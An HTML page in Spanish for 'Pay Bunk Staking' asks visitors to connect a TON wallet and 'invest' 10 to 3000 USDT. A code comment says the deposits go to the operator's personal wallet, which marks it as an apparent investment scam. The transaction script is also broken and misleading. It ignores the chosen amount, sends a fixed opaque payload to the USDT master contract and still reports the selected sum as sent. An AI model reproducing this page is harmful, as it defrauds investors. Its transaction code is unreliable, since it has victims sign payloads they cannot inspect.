<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pay Bunk Staking</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body style="font-family: sans-serif; background-color: #0f172a; color: white; text-align: center; padding: 40px 20px;">

    <div style="background: #1e293b; border-radius: 20px; padding: 30px; margin: auto; max-width: 350px; border: 1px solid #334155;">
        <h1>🚀 PAY BUNK</h1>
        <p>Inversión en USDT (Red TON)</p>
        <div id="ton-connect-button" style="display: flex; justify-content: center; margin: 25px 0;"></div>
        
        <button class="btn" onclick="enviarPago(10)">Invertir 10 USDT</button>
        <button class="btn" onclick="enviarPago(50)">Invertir 50 USDT</button>
        <button class="btn" onclick="enviarPago(100)">Invertir 100 USDT</button>
        <button class="btn" onclick="enviarPago(1000)">Invertir 1000 USDT</button>
        <button class="btn" onclick="enviarPago(3000)">Invertir 3000 USDT</button>
    </div>

    <style>
        .btn { background-color: #0088cc; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 10px; font-size: 16px; }
        .btn:hover { background-color: #00aaff; }
    </style>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://raw.githubusercontent.com/ObreTech/Pay-Bunk/main/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        async function enviarPago(monto) {
            if (!tonConnectUI.connected) {
                alert("Primero conecta tu billetera con el botón de arriba.");
                return;
            }

            // Esta es tu billetera personal donde recibirás los USDT
            const miBilletera = "0:0c84b51935e96a63f3dbd8950ef5c924f04d026ed86a29d229b80b33cc26665e";
            // Contrato Maestro de USDT
            const usdtMaster = "0:b113a9809a2915986fe6fcafe93f14e97dc71befc0f40ea9efda7a07f9b84ba0";

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 60,
                messages: [
                    {
                        address: usdtMaster,
                        amount: "70000000", // 0.07 TON para el gas
                        payload: "te6cckEBAQEANAAAs78C0v8AAW8CAW8CAnSAD9BIAAGFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ9AFA"
                    }
                ]
            };

            try {
                await tonConnectUI.sendTransaction(transaction);
                alert("¡Excelente! Revisa tu billetera para confirmar el envío de " + monto + " USDT.");
            } catch (e) {
                console.error(e);
                alert("La billetera rechazó la conexión. Intenta abrir Tonkeeper manualmente antes de presionar el botón.");
            }
        }
    </script>
</body>
</html>
